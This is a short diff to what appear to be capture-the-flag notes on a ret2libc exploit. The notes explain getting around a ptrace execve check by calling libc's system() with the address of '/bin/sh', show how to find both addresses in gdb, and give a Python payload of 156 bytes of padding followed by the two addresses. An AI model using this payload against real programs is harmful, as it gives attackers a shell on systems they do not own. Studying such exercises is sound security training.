@@ -4,4 +4,6 @@ they use ptrace to make sure that we don't use execve in our shellcode
 we can directly call the library system function, get address via gdb, just need something after
 in the next 4 bytes to fill the return address of system, and last 4 bytes being the
 address of '/bin/sh' inside the program.
+p system in gdb to find the adress of system
+info proc map and then find in libc adresses /bin/sh to find the adress of /bin/sh
 SHELLCODE = `python -c 'import struct; print "a" * 156 + struct.pack("<I", ADDRESS system() ) +"a" *4 + struct.pack("<I", ADDRESS /bin/sh)'`
